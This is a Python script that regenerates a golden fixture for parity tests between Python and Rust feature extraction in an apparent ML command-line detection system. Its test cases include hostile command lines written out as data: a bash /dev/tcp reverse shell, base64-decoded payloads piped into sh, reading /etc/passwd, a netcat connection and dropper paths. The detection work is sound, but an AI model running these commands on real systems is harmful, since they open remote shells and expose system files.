"""Regenerates the Python/Rust feature-parity golden file (fixtures/features_golden.jsonl).

The golden file locks the central contract of the ML scoring: `features.extract_features`
(training, Python) and `synthaea_ml::features::extract_features` (inference, Rust) MUST
produce the same vector for the same cmdline. Both test suites consume it:

  - ml/tests/test_features_golden.py           (pytest — drift on the Python side)
  - crates/synthaea-ml/tests/features_golden.rs (cargo test — drift on the Rust side)

Python is the reference: it is what defines the model's input space at training time.
After ANY change to features.py, regenerate the file (and retrain the models):

    python tests/fixtures/gen_features_golden.py

A change to the golden file in a diff without retraining the .onnx files should raise a flag
in review: the embedded model would then be scoring vectors it never saw during training.
"""

import json
from pathlib import Path

from synthaea_ml.features.cmdline import extract_features

# Cases chosen to cover every feature and every known parity pitfall:
# encoding (bytes vs characters), Unicode digits, argv `\0` separators, Windows case.
CASES = [
    # Edge cases
    "",
    "a",
    # Typical benign (Linux, argv separated by \0 as in ExecEvent::cmdline_str)
    "ls\0-la\0/home/user\0",
    "curl\0-f\0http://backend:8000/api/health/\0",
    "/usr/bin/python3\0/usr/local/bin/script.py\0--verbose\0",
    # Suspicious: base64 decode piped into a shell
    "bash\0-c\0$(echo ZWNobyBoZWxsbw== | base64 -d)\0",
    "sh\0-c\0echo cHdk | base64 --decode | sh\0",
    # Reverse shell / dev/tcp
    "bash\0-i\0>&\0/dev/tcp/10.0.0.1/4444\x000>&1\0",
    # Shell metacharacters and substitutions
    "sh\0-c\0cat /etc/passwd | grep root; id && whoami\0",
    # Suspicious and legitimate Windows paths (case test: case-insensitive matching)
    "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe\0",
    "c:\\users\\bob\\appdata\\local\\temp\\payload.exe\0",
    "C:\\Windows\\System32\\svchost.exe\0-k\0netsvcs\0",
    "C:\\WINDOWS\\SYSTEM32\\cmd.exe\0/c\0dir\0",
    "%TEMP%\\dropper.exe\0",
    # High digit ratio
    "nc\0192.168.1.100\04444\0",
    "ping\0-c\04\08.8.8.8\0",
    # Long Docker/containerd-style line (benign noise not to over-score)
    (
        "/usr/bin/containerd-shim-runc-v2\0-namespace\0moby\0-id\0"
        "4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a\0-address\0"
        "/run/containerd/containerd.sock\0"
    ),
    # Non-ASCII: parity pitfalls (bytes vs characters, Unicode digits, accents)
    "echo\0héllo wörld\0",
    "echo\0日本語のコマンド\0",
    "echo\0x²+y³\0",
    "python3\0-c\0print('café №5')\0",
    # Characters that need JSON escaping (quotes, backslash, newline)
    'sh\0-c\0echo "quoted \\ value"\n\0',
]

OUT = Path(__file__).resolve().parent / "features_golden.jsonl"


def main() -> None:
    OUT.parent.mkdir(parents=True, exist_ok=True)
    with OUT.open("w", encoding="utf-8") as f:
        for cmdline in CASES:
            row = {"cmdline": cmdline, "features": extract_features(cmdline)}
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
    print(f"{len(CASES)} cases written to {OUT}")


if __name__ == "__main__":
    main()
